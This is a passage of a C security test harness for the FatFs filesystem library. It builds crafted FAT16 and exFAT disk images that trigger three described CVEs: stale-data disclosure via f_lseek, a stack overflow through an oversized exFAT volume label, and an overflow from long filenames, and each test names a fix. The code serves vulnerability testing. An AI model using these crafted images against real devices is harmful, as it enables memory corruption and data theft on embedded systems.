    return actual_guard ? 0 : 1;
}

/*===========================================================================
 * CVE-2026-6686: Uninitialized data disclosure via f_lseek() beyond EOF
 *
 * Root cause (ff.c ~line 4680):
 *
 *     if (!FF_FS_READONLY && fp->fptr > fp->obj.objsize) {
 *         fp->obj.objsize = fp->fptr;          // extend size
 *         fp->flag |= FA_MODIFIED;             // mark for sync
 *         // ← NO zeroing of the new region
 *     }
 *
 * After f_sync the directory entry records the extended size.  Any caller
 * who reads the extended region gets whatever bytes happened to reside in
 * the underlying cluster — from a previously deleted file, formatted
 * scratch data, heap artefacts, or sensitive application state.
 *
 * Reproduction:
 *   1. Allocate cluster 2 to a "sensitive" file; write a secret pattern.
 *   2. Delete the file (FAT entry reset to FREE, cluster content intact).
 *   3. Create a new small file — FatFs allocates cluster 2 again (first
 *      free cluster from fs->last_clst hint).
 *   4. Write only the first N bytes; close.
 *   5. Reopen r/w, f_lseek past N → objsize grows, no zeroing.
 *   6. f_close / reopen read-only, f_read full extended size.
 *   7. Bytes [N, extended_size) still hold the secret pattern.
 *
 * Disk layout (FAT16, 4 sectors/cluster):
 *   Sectors  0           VBR
 *   Sectors  1-4         FAT1 (4 sectors)
 *   Sectors  5-8         FAT2 (mirror)
 *   Sectors  9-12        Root directory (64 entries × 32 bytes)
 *   Sectors  13-16       Cluster 2 ← data                       *
 *===========================================================================*/

/* ── FAT16 image builder ─────────────────────────────────────────────────── */
#define F16_BYTES_PER_SEC  512U
#define F16_SEC_PER_CLUS   4U
#define F16_RESERVED_SECS  1U
#define F16_N_FATS         2U
#define F16_ROOT_ENTRIES   64U
#define F16_FAT_SIZE_SECS  4U
#define F16_TOT_SECS       2048U

#define F16_ROOT_DIR_SECS  (F16_ROOT_ENTRIES * 32U / F16_BYTES_PER_SEC)  /* 4 */
#define F16_SYS_SECS       (F16_RESERVED_SECS + F16_N_FATS * F16_FAT_SIZE_SECS + F16_ROOT_DIR_SECS)
/* = 1 + 8 + 4 = 13 */
#define F16_FAT_OFFSET_SECS(n) (F16_RESERVED_SECS + (n) * F16_FAT_SIZE_SECS)
#define F16_ROOT_OFFSET_SECS   (F16_RESERVED_SECS + F16_N_FATS * F16_FAT_SIZE_SECS)
#define F16_DATA_OFFSET_SECS   F16_SYS_SECS                              /* 13 */
#define F16_CLUS2SEC(c)        (F16_DATA_OFFSET_SECS + ((c) - 2U) * F16_SEC_PER_CLUS)

static void write_fat16_entry(BYTE *fat_sector, uint16_t cluster, uint16_t value)
{
    /* Each FAT16 sector holds 256 entries */
    uint32_t offset = (cluster % 256U) * 2U;
    st16le(&fat_sector[offset], value);
}

static void build_fat16_base(BYTE *disk, size_t disk_bytes)
{
    memset(disk, 0, disk_bytes);
    BYTE *vbr = disk;

    vbr[0] = 0xEB; vbr[1] = 0x3C; vbr[2] = 0x90;
    memcpy(&vbr[3], "MSDOS5.0", 8);

    st16le(&vbr[11], F16_BYTES_PER_SEC);
    vbr[13]       = (BYTE)F16_SEC_PER_CLUS;
    st16le(&vbr[14], F16_RESERVED_SECS);
    vbr[16]       = (BYTE)F16_N_FATS;
    st16le(&vbr[17], F16_ROOT_ENTRIES);
    st16le(&vbr[19], F16_TOT_SECS);
    vbr[21]       = 0xF8;
    st16le(&vbr[22], F16_FAT_SIZE_SECS);
    st16le(&vbr[24], 63);
    st16le(&vbr[26], 255);
    st32le(&vbr[28], 0);
    st32le(&vbr[32], 0);        /* BPB_TotSec32 = 0 (use TotSec16) */

    /* FAT-specific extension */
    vbr[36] = 0x80;             /* BS_DrvNum  */
    vbr[38] = 0x29;             /* BS_BootSig */
    st32le(&vbr[39], 0xCAFEBABEU);
    memcpy(&vbr[43], "INFOLEAK   ", 11);
    memcpy(&vbr[54], "FAT16   ", 8);
    st16le(&vbr[510], 0xAA55);

    /* Initialise both FAT copies */
    for (int f = 0; f < 2; f++) {
        BYTE *fat = disk + F16_FAT_OFFSET_SECS(f) * 512;
        st16le(&fat[0], 0xFFF8);  /* cluster 0: media bytes  */
        st16le(&fat[2], 0xFFFF);  /* cluster 1: reserved EOC */
        /* cluster 2 through end: FREE (0x0000) — already zero */
    }
}

__attribute__((unused))
static void fat16_set_chain(BYTE *disk, uint16_t cluster, uint16_t next)
{
    for (int f = 0; f < 2; f++) {
        BYTE *fat = disk + F16_FAT_OFFSET_SECS(f) * 512;
        write_fat16_entry(fat, cluster, next);
    }
}

/* ── the actual test ─────────────────────────────────────────────────────── */
#define SECRET_PATTERN   0xAA
/* Write exactly one full cluster so fp->buf is never used (direct sector
 * writes) and the cluster-2 content is fully under our control (0xBB).
 * Seek ONE byte into the NEXT cluster: f_lseek calls create_chain to
 * allocate cluster 3 but never zeros its sectors → stale data survives. */
#define WRITE_SIZE       (F16_SEC_PER_CLUS * F16_BYTES_PER_SEC)  /* 2048 */
#define LSEEK_TARGET     (WRITE_SIZE + 1U)    /* 1 byte into cluster 3 */

static int test_bug5_infoleak_lseek(void)
{
    printf("\n[CVE-2026-6686] Uninitialized data disclosure via f_lseek() beyond EOF\n");
    printf("  Vulnerable code:  fp->obj.objsize = fp->fptr (no cluster zero-fill)\n");
    printf("  Trigger:          write full cluster 2, f_lseek into cluster 3,\n");
    printf("                    cluster 3 allocated via create_chain but not zeroed\n");

    BYTE image[RAMDISK_SIZE_BYTES];
    build_fat16_base(image, sizeof(image));

    /* ── Step 1: seed the ENTIRE data area with SECRET_PATTERN ───────────── *
     * We don't know in advance which absolute cluster FatFs will allocate    *
     * for the lseek extension (depends on last_clst hint).  By painting ALL  *
     * clusters 0xAA, every un-written cluster is guaranteed stale.           *
     * f_write overwrites only the FIRST cluster (WRITE_SIZE bytes, 4 full    *
     * sectors via multi-sector disk_write) with 0xBB; every other cluster    *
     * in the data area remains 0xAA — including whichever cluster             *
     * create_chain picks for the extension.                                   */
    memset(image + F16_DATA_OFFSET_SECS * 512U, SECRET_PATTERN,
           (F16_TOT_SECS - F16_DATA_OFFSET_SECS) * 512U);

    INFO("Pre-seeded ALL data clusters (secs %u..%u) with 0x%02X",
         F16_DATA_OFFSET_SECS, F16_TOT_SECS - 1U, SECRET_PATTERN);

    ramdisk_load(image, sizeof(image));

    /* Mount */
    FATFS fs;
    memset(&fs, 0, sizeof(fs));
    FRESULT res = f_mount(&fs, "0:", 1);
    if (res != FR_OK) {
        INFO("f_mount failed (%d) — aborting test.", (int)res);
        RESULT("CVE-2026-6686: info disclosure via lseek", 0);
        return 1;
    }

    /* ── Step 2: create file, write exactly one full cluster (WRITE_SIZE) ─── *
     * Because btr == WRITE_SIZE (multiple of SS), FatFs issues direct         *
     * disk_write calls (multi-sector path) — fp->buf is never loaded, so the  *
     * write truly replaces all of cluster 2 with 0xBB bytes.                  */
    FIL fp;
    UINT bw;
    BYTE *payload = malloc(WRITE_SIZE);
    if (!payload) { f_mount(NULL,"0:",0); return 1; }
    memset(payload, 0xBB, WRITE_SIZE);

    res = f_open(&fp, "0:/newfile.txt", FA_CREATE_NEW | FA_WRITE);
    if (res != FR_OK) {
        INFO("f_open(CREATE_NEW) failed (%d)", (int)res);
        free(payload); f_mount(NULL, "0:", 0);
        RESULT("CVE-2026-6686: info disclosure via lseek", 0);
        return 1;
    }
    res = f_write(&fp, payload, WRITE_SIZE, &bw);
    free(payload);
    f_sync(&fp);
    INFO("Wrote %u bytes (0xBB) to newfile.txt; objsize=%u  sclust=%u  clust=%u",
         bw, (unsigned)fp.obj.objsize, (unsigned)fp.obj.sclust, (unsigned)fp.clust);

    /* ── Step 3: seek 1 byte into cluster 3 ────────────────────────────────── *
     * f_lseek enters the "cluster following" loop:                             *
     *   while (ofs > bcs) { ofs -= bcs; clst = create_chain(obj, clst); }     *
     * create_chain updates the FAT to link cluster 3 but does NOT zero sectors *
     * 17-20 (F16_CLUS2SEC(3)..+3).  The 0xAA bytes remain on-disk.           */
    res = f_lseek(&fp, LSEEK_TARGET);
    INFO("f_lseek(fp, %u): res=%d  fptr=%u  objsize=%u  clust=%u",
         LSEEK_TARGET, (int)res,
         (unsigned)fp.fptr, (unsigned)fp.obj.objsize, (unsigned)fp.clust);

    f_sync(&fp);   /* directory entry records size = LSEEK_TARGET */
    f_close(&fp);
    INFO("Directory entry size flushed to %u bytes", LSEEK_TARGET);

    /* ── Step 4: read back and check for stale 0xAA in cluster 3 ─────────── */
    res = f_open(&fp, "0:/newfile.txt", FA_READ);
    BYTE *readbuf = malloc(LSEEK_TARGET);
    if (!readbuf) { f_mount(NULL,"0:",0); return 1; }
    memset(readbuf, 0xCC, LSEEK_TARGET);  /* sentinel — must not survive scan */
    UINT br = 0;
    res = f_read(&fp, readbuf, LSEEK_TARGET, &br);
    f_close(&fp);
    INFO("f_read returned %u bytes (expected %u)", br, LSEEK_TARGET);

    /* Verify: cluster 2 was correctly overwritten with 0xBB */
    int written_ok = (br >= WRITE_SIZE);
    for (UINT i = 0; i < WRITE_SIZE && i < br; i++) {
        if (readbuf[i] != 0xBB) { written_ok = 0; break; }
    }
    INFO("Cluster 2 bytes [0..%u): all 0xBB?  %s", WRITE_SIZE,
         written_ok ? "YES" : "NO");

    /* The stale byte: readbuf[WRITE_SIZE] must be 0xAA — NOT zeroed by FatFs */
    int stale_found = (br == LSEEK_TARGET) && (readbuf[WRITE_SIZE] == SECRET_PATTERN);
    INFO("Cluster 3 byte [%u] = 0x%02X  (expect 0x%02X, stale?  %s)",
         WRITE_SIZE, br > WRITE_SIZE ? readbuf[WRITE_SIZE] : 0xFF,
         SECRET_PATTERN, stale_found ? "YES — EXPOSED" : "no");

    if (stale_found) {
        INFO("IMPACT: attacker reads stale data from previously deleted cluster");
        INFO("        Secret pattern 0x%02X leaked at byte offset %u of file",
             SECRET_PATTERN, WRITE_SIZE);
        INFO("FIX:    zero newly allocated cluster sectors in create_chain()");
    }

    free(readbuf);
    RESULT("CVE-2026-6686: stale cluster data readable after f_lseek extension", stale_found);

    f_mount(NULL, "0:", 0);
    return stale_found ? 0 : 1;
}

/*===========================================================================
 * CVE-2026-6687: Stack buffer overflow in f_getlabel() via exFAT XDIR_NumLabel
 *
 * Vulnerable code (ff.c f_getlabel, exFAT path):
 *
 *     for (si = di = hs = 0; si < dj.dir[XDIR_NumLabel]; si++) {
 *         wc = ld_16(dj.dir + XDIR_Label + si * 2);
 *         nw = put_utf((DWORD)hs << 16 | wc, &label[di], 4); // ← FIXED szb=4!
 *         di += nw;
 *     }
 *
 * The exFAT spec limits XDIR_NumLabel to 11 characters.  FatFs reads it as
 * a raw BYTE from the on-disk directory entry (0-255) and never validates
 * it against the spec maximum.  Because put_utf() is called with a fixed
 * size of 4, it always succeeds for BMP characters, writing up to 1 byte
 * per ASCII char.  `di` grows unconstrained relative to the caller's label
 * buffer.
 *
 * Impact: A crafted exFAT volume with XDIR_NumLabel = 128 causes f_getlabel
 * to write 128 characters (+ null) into the caller's label buffer.  Typical
 * callers declare char label[12] or char label[24] on the stack.  Writing
 * 128 bytes from offset 0 smashes the stack frame: return address, saved
 * registers, adjacent variables.
 *
 * Reproduction:
 *   1. Craft exFAT image with a valid VBR, allocation bitmap, and a volume
 *      label directory entry (type 0x83) with XDIR_NumLabel = 128 and 128
 *      UTF-16LE 'A' characters in the label data.
 *   2. Mount the image; call f_getlabel("0:", victim_buf, NULL) where
 *      victim_buf is only 24 bytes.
 *   3. FatFs writes 128 'A' + null = 129 bytes into a 24-byte buffer.
 *      ASan catches the overflow; a canary probe detects it without ASan.
 *
 * Fix: validate dj.dir[XDIR_NumLabel] <= 11 before entering the loop,
 *      or pass (sizeof_label - di) instead of the hard-coded 4.
 *===========================================================================*/

/* Minimal mountable exFAT image with XDIR_NumLabel set to a crafted value. *
 * Layout:                                                                   *
 *   Sector  0: exFAT VBR                                                    *
 *   Sector 24: FAT (clusters 0-3 marked)                                    *
 *   Sector 25: root directory cluster                                        *
 *     entry 0 (offset   0): Allocation Bitmap (ET_BITMAP=0x81, clus=3)     *
 *     entry 1 (offset  32): Volume Label     (ET_VLABEL=0x83, crafted)     *
 *   Sector 26: allocation bitmap data (all zeros = no clusters in use)      */
static void build_exfat_large_label(BYTE *disk, size_t disk_bytes,
                                    uint8_t num_label_chars)
{
    memset(disk, 0, disk_bytes);

    /* ── exFAT VBR (sector 0) ─────────────────────────────────────────── */
    BYTE *vbr = disk;
    vbr[0] = 0xEB; vbr[1] = 0x76; vbr[2] = 0x90;
    memcpy(&vbr[3], "EXFAT   ", 8);
    /* bytes 11..63: BPB_ZeroedEx — must be zero (already zeroed) */
    st64le(&vbr[64], 0);                        /* BPB_VolumeOffset        */
    st64le(&vbr[72], (uint64_t)(disk_bytes / 512)); /* BPB_TotSecEx        */
    st32le(&vbr[80], 24);                       /* BPB_FatOfsEx = 24       */
    st32le(&vbr[84], 1);                        /* BPB_FatSzEx  = 1 sector */
    st32le(&vbr[88], 25);                       /* BPB_DataOfsEx = 25      */
    st32le(&vbr[92], 10);                       /* BPB_NumClusEx = 10      */
    st32le(&vbr[96], 2);                        /* BPB_RootClusEx = 2      */
    st32le(&vbr[100], 0xBEEF1234U);            /* BPB_VolSerialEx         */
    st16le(&vbr[104], 0x0100);                  /* BPB_FSVerEx = 1.0       */
    vbr[108] = 9;                               /* BPB_BytsPerSecEx: 2^9   */
    vbr[109] = 0;                               /* BPB_SecPerClusEx: 2^0=1 */
    vbr[110] = 1;                               /* BPB_NumFATsEx = 1       */
    vbr[112] = 0xFF;                            /* BPB_PercInUseEx         */
    st16le(&vbr[510], 0xAA55);

    /* ── FAT (sector 24) ─────────────────────────────────────────────── */
    BYTE *fat = disk + 24 * 512;
    st32le(&fat[0],  0xFFFFFFF8U); /* cluster 0: media    */
    st32le(&fat[4],  0xFFFFFFFFU); /* cluster 1: EOC      */
    st32le(&fat[8],  0xFFFFFFFFU); /* cluster 2: root EOC */
    st32le(&fat[12], 0xFFFFFFFFU); /* cluster 3: bitmap EOC (single-cluster, contiguous) */

    /* ── Root directory (sector 25 = cluster 2) ─────────────────────── */
    BYTE *root = disk + 25 * 512;

    /* Entry 0: Allocation Bitmap (required for exFAT mount) */
    root[0]  = 0x81;  /* EntryType = ET_BITMAP */
    root[1]  = 0x01;  /* GeneralSecondaryFlags: AllocPossible=1, NoFatChain=1 */
    /* bytes 2..19: reserved = 0 */
    st32le(&root[20], 3);   /* FirstCluster = 3 (bitmap cluster) */
    st64le(&root[24], 2);   /* DataLength   = 2 bytes (ceil(10/8)) */

    /* Entry 1: Volume Label (ET_VLABEL = 0x83) — CRAFTED */
    BYTE *lab = root + 32;
    lab[0] = 0x83;           /* EntryType = ET_VLABEL */
    lab[1] = num_label_chars; /* XDIR_NumLabel ← CRAFTED: may exceed spec max of 11 */
    /* Label chars: num_label_chars × UTF-16LE 'A' (0x0041).
     * Cap writes at what fits within sector 25 to avoid corrupting adjacent
     * sectors in the disk image; the XDIR_NumLabel field in the entry header
     * retains the full crafted value so FatFs still iterates num_label_chars
     * times and overflows the caller's label buffer. */
    uint8_t n_write = num_label_chars;
    if ((size_t)n_write * 2 + 2 > (size_t)(512 - 32))  /* stay inside sector */
        n_write = (uint8_t)((512 - 32 - 2) / 2);
    for (uint8_t i = 0; i < n_write; i++) {
        lab[2 + i * 2]     = 'A';   /* UTF-16LE low  byte */
        lab[2 + i * 2 + 1] = 0x00;  /* UTF-16LE high byte */
    }
    /* sector 26 = cluster 3 = bitmap data: all zeros (no clusters in use) */
}

static int test_bug6_getlabel_exfat_overflow(void)
{
    printf("\n[CVE-2026-6687] Stack buffer overflow in f_getlabel() via exFAT XDIR_NumLabel\n");
    printf("  Vulnerable code:  no upper-bound check on dj.dir[XDIR_NumLabel]\n");
    printf("  Craft:            exFAT VBR + label entry with XDIR_NumLabel=128\n");
    printf("  Effect:           f_getlabel writes 128 chars into caller label[24]\n");

    BYTE image[RAMDISK_SIZE_BYTES];
    build_exfat_large_label(image, sizeof(image), 128);
    ramdisk_load(image, sizeof(image));

    FATFS fs;
    memset(&fs, 0, sizeof(fs));
    FRESULT res = f_mount(&fs, "0:", 1);
    if (res != FR_OK) {
        INFO("f_mount failed (%d) — exFAT image may need adjustment.", (int)res);
        RESULT("CVE-2026-6687: exFAT label overflows caller buffer", 0);
        return 1;
    }
    INFO("f_mount OK (fs_type=%u)", (unsigned)fs.fs_type);

    /* ── Probe for overflow without requiring ASan ────────────────────── *
     * Allocate a 256-byte probe buffer; treat the first 24 bytes as the   *
     * caller's "typical" label buffer.  Fill the whole probe with a known  *
     * sentinel byte (0xC3) so that any write beyond offset 24 is visible.  *
     * f_getlabel must receive a pointer to byte 0 of probe so that the     *
     * overflow lands in the same contiguous allocation (detectable by ASan  *
     * and by the canary check below).                                       */
    BYTE *probe = (BYTE *)malloc(256);
    if (!probe) { f_mount(NULL, "0:", 0); return 1; }
    memset(probe, 0xC3, 256);

    res = f_getlabel("0:", (TCHAR *)probe, NULL);
    INFO("f_getlabel returned %d", (int)res);

    /* Count how many bytes were written (non-sentinel bytes) */
    int written = 0;
    while (written < 256 && probe[written] != (BYTE)0xC3) written++;
    INFO("f_getlabel wrote %d chars to label buffer (probe[0..%d])",
         written, written - 1);

    /* The overflow is confirmed when more than 24 chars were written into
     * a buffer that a typical caller would declare as label[24]. */
    int overflowed = (written > 24);
    if (overflowed) {
        INFO("OVERFLOW CONFIRMED: %d chars written, only 24 expected",  written);
        INFO("Stack corruption would occur in any caller using char label[24]");
        INFO("FIX: validate dj.dir[XDIR_NumLabel] <= 11 in f_getlabel()");
    } else {
        char label_str[32];
        memcpy(label_str, probe, written < 31 ? written : 31);
        label_str[written < 31 ? written : 31] = '\0';
        INFO("label = \"%s\" (%d chars)", label_str, written);
    }

    free(probe);
    RESULT("CVE-2026-6687: f_getlabel writes beyond caller label[24] (XDIR_NumLabel=128)",
           overflowed);

    f_mount(NULL, "0:", 0);
    return overflowed ? 0 : 1;
}

/*===========================================================================
 * CVE-2026-6688: Stack buffer overflow in calling program via long LFN filename
 *
 * Root cause: With FF_USE_LFN enabled, f_readdir() fills fno.fname with
 * the full Long File Name — up to FF_LFN_BUF (255) characters.  Callers
 * that were written for SFN-only operation may have stack buffers sized
 * for 8.3 names (12 bytes) or short paths (16-28 bytes).  When such code
 * copies fno.fname without bounds checking, the on-disk LFN length directly
 * controls how many bytes are written, allowing a crafted disk to corrupt
 * the caller's stack.
 *
 * Common vulnerable patterns in calling programs:
 *   char path[16];
 *   sprintf(path, "0:/%s", fno.fname);  // overflows if LFN > 12 chars
 *
 *   char fname[13];                     // SFN-sized buffer
 *   strcpy(fname, fno.fname);           // overflows if LFN > 12 chars
 *
 * Disk trigger: any FAT12/16/32 directory entry with LFN entries whose
 * combined name length exceeds the caller's buffer capacity.
 *
 * The libfuzzer_harness.c previously used char path[16 + FF_SFN_BUF] = [28]
 * instead of char path[4 + FF_LFN_BUF] = [259], accidentally preventing
 * f_open on any long-named file and hiding this vulnerability pattern from
 * the fuzzer.  That bug has been fixed.
 *===========================================================================*/

/* SFN checksum — matches sum_sfn() in ff.c */
static BYTE sfn_checksum_b7(const BYTE sfn[11])
{
    BYTE sum = 0;
    for (int i = 0; i < 11; i++)
        sum = (BYTE)(((sum & 1) ? 0x80 : 0) + (sum >> 1) + sfn[i]);
    return sum;
}

/* LFN character offsets within a 32-byte directory entry */
static const int LFN_CHAR_OFFSETS[13] = {1,3,5,7,9,14,16,18,20,22,24,28,30};

/* Build a FAT16 image containing one file with a long LFN. */
#define B7_LFN_LEN    50    /* LFN length: "A" × 50 */
#define B7_FILE_SIZE  64    /* file body: 64 bytes of 'D' */

static void build_fat16_with_lfn(BYTE *disk, size_t disk_bytes)
{
    build_fat16_base(disk, disk_bytes);

    /* SFN = "AAAAAA~1   " (8+3, space-padded) */
    static const BYTE sfn[11] = {'A','A','A','A','A','A','~','1',' ',' ',' '};
    BYTE cksum = sfn_checksum_b7(sfn);

    /* N LFN entries: ceil(B7_LFN_LEN / 13) = 4 */
    const int N = (B7_LFN_LEN + 12) / 13;  /* 4 */

    BYTE *root = disk + F16_ROOT_OFFSET_SECS * 512;

    /* Write LFN entries in physical directory order: seq=N|LLEF first */
    for (int seq = N; seq >= 1; seq--) {
        BYTE *e = root + (N - seq) * 32;
        memset(e, 0xFF, 32);           /* pre-fill pad chars with 0xFFFF */
        e[0]  = (BYTE)(seq | (seq == N ? 0x40 : 0));  /* LDIR_Ord */
        e[11] = 0x0F;                  /* LDIR_Attr = AM_LFN */
        e[12] = 0x00;                  /* LDIR_Type */
        e[13] = cksum;                 /* LDIR_Chksum */
        e[26] = 0x00; e[27] = 0x00;   /* LDIR_FstClusLO must be 0 */

        for (int ci = 0; ci < 13; ci++) {
            int name_idx = (seq - 1) * 13 + ci;
            uint16_t wc;
            if (name_idx < B7_LFN_LEN)       wc = 'A';    /* LFN char */
            else if (name_idx == B7_LFN_LEN)  wc = 0x0000; /* null     */
            else                              wc = 0xFFFF; /* filler   */
            e[LFN_CHAR_OFFSETS[ci]]     = (BYTE)wc;
            e[LFN_CHAR_OFFSETS[ci] + 1] = (BYTE)(wc >> 8);
        }
    }

    /* SFN directory entry (follows the N LFN entries) */
    BYTE *sfn_ent = root + N * 32;
    memset(sfn_ent, 0, 32);
    memcpy(sfn_ent, sfn, 11);
    sfn_ent[11] = 0x20;            /* AM_ARC */
    sfn_ent[26] = 0x02; sfn_ent[27] = 0x00;  /* first cluster = 2 */
    st32le(&sfn_ent[28], B7_FILE_SIZE);

    /* FAT entry: cluster 2 = EOC */
    for (int f = 0; f < 2; f++) {
        BYTE *fat = disk + F16_FAT_OFFSET_SECS(f) * 512;
        fat[4] = 0xFF; fat[5] = 0xFF;  /* cluster 2: EOC */
    }

    /* Data at cluster 2 */
    memset(disk + F16_CLUS2SEC(2) * 512, 'D', B7_FILE_SIZE);
}

static int test_bug7_lfn_path_overflow(void)
{
    printf("\n[CVE-2026-6688] Stack buffer overflow via long LFN filename in calling program\n");
    printf("  Root cause: fno.fname up to %d chars with FF_USE_LFN=1\n",
           (int)FF_LFN_BUF);
    printf("  Trigger:    FAT16 disk with %d-char LFN, caller uses small path buf\n",
           (int)B7_LFN_LEN);

#if FF_USE_LFN == 0
    INFO("FF_USE_LFN=0 — LFN not enabled, test skipped.");
    RESULT("CVE-2026-6688: LFN overflow skipped (LFN disabled in this build)", 1);
    return 0;
#else
    BYTE image[RAMDISK_SIZE_BYTES];
    build_fat16_with_lfn(image, sizeof(image));
    ramdisk_load(image, sizeof(image));

    FATFS fs;
    memset(&fs, 0, sizeof(fs));
    FRESULT res = f_mount(&fs, "0:", 1);
    if (res != FR_OK) {
        INFO("f_mount failed (%d)", (int)res);
        RESULT("CVE-2026-6688: LFN path overflow", 0);
        return 1;
    }

    /* Read the first directory entry to get the LFN into fno.fname */
    DIR dj;
    FILINFO fno;
    res = f_opendir(&dj, "0:/");
    if (res != FR_OK) {
        INFO("f_opendir failed (%d)", (int)res);
        f_mount(NULL, "0:", 0);
        RESULT("CVE-2026-6688: LFN path overflow", 0);
        return 1;
    }
    res = f_readdir(&dj, &fno);
    f_closedir(&dj);

    if (res != FR_OK || fno.fname[0] == 0) {
        INFO("f_readdir did not return an entry, res=%d", (int)res);
        f_mount(NULL, "0:", 0);
        RESULT("CVE-2026-6688: LFN path overflow", 0);
        return 1;
    }

    UINT fname_len = 0;
    while (fno.fname[fname_len]) fname_len++;
    INFO("f_readdir fno.fname = \"%.*s...\" (%u chars, max %u)",
         fname_len > 20 ? 20 : (int)fname_len, fno.fname,
         fname_len, (unsigned)FF_LFN_BUF);

    /* ── Demonstrate overflow using a heap canary probe ─────────────── *
     * A caller's "legacy" code might do:                                *
     *   char path[20];                                                  *
     *   strcpy(path, "0:/");                                            *
     *   strcat(path, fno.fname);  // BUG if fname > 16 chars            *
     *                                                                   *
     * We replicate that pattern with a heap allocation so ASan          *
     * catches the overflow.  A canary byte after the 20-byte region    *
     * detects it without ASan.                                          */
    const UINT SAFE_SIZE = 20;   /* legacy stack buffer size             */
    BYTE *probe = (BYTE *)malloc(SAFE_SIZE + 8);  /* +8 canary bytes    */
    if (!probe) { f_mount(NULL, "0:", 0); return 1; }
    memset(probe, 0xC3, SAFE_SIZE + 8);
    memcpy(probe, "0:/", 3);

    /* Simulate the unsafe strcat — intentionally NOT using strncat to
     * reproduce the caller's bug.  ASan will flag this immediately.    */
    UINT written = 3;
    for (UINT i = 0; fno.fname[i] && written < SAFE_SIZE + 8; i++)
        probe[written++] = (BYTE)fno.fname[i];
    if (written < SAFE_SIZE + 8)
        probe[written] = 0;

    /* Check how many bytes were written beyond SAFE_SIZE */
    int overflowed = 0;
    for (UINT i = SAFE_SIZE; i < SAFE_SIZE + 8; i++) {
        if (probe[i] != 0xC3) { overflowed = 1; break; }
    }
    INFO("Naive strcat wrote %u bytes total; SAFE_SIZE=%u; overflow=%s",
         written, SAFE_SIZE, overflowed ? "YES" : "no");
    if (overflowed) {
        INFO("IMPACT: %u-char LFN in path overflows caller's %u-byte buffer",
             fname_len, SAFE_SIZE);
        INFO("FIX:    size path buffers as char path[4 + FF_LFN_BUF]");
        INFO("        use strncat(path, fno.fname, sizeof(path)-strlen(path)-1)");
    }

    free(probe);
    RESULT("CVE-2026-6688: long LFN overflows SFN-sized caller path buffer", overflowed);

    f_mount(NULL, "0:", 0);
    return overflowed ? 0 : 1;
#endif /* FF_USE_LFN */
}

/*===========================================================================
 * main
 *===========================================================================*/
int main(void)
{
    printf("=================================================================\n");
    printf(" FatFs R0.16 — Security Test Harness\n");
    printf("=================================================================\n");
#if FF_LBA64
    printf(" Build: extended (FF_LBA64=1, FF_FS_EXFAT=1, FF_USE_LFN=1)\n");
#else
    printf(" Build: default  (FAT12/16/32 only)\n");
#endif
    printf("-----------------------------------------------------------------\n");

    int rc = 0;
    rc |= test_bug1_fat32_integer_overflow();
    rc |= test_bug1_rce_exploit();
    rc |= test_bug4_stale_cache_skip();
    rc |= test_bug5_infoleak_lseek();
#if FF_LBA64
    rc |= test_bug3_gpt_loop_dos();
#else
    printf("\n[CVE-2026-6684] (GPT DoS) skipped — rebuild with FF_LBA64=1\n");
    printf("  Run:  make extended\n");
#endif
#if FF_FS_EXFAT
    rc |= test_bug6_getlabel_exfat_overflow();
#else
    printf("\n[CVE-2026-6687] (exFAT label overflow) skipped — rebuild with FF_FS_EXFAT=1\n");
#endif
    rc |= test_bug7_lfn_path_overflow();

    printf("\n=================================================================\n");
    printf(" Results: %d confirmed  /  %d not triggered\n", g_pass, g_fail);
    printf("=================================================================\n");
    return rc;
}
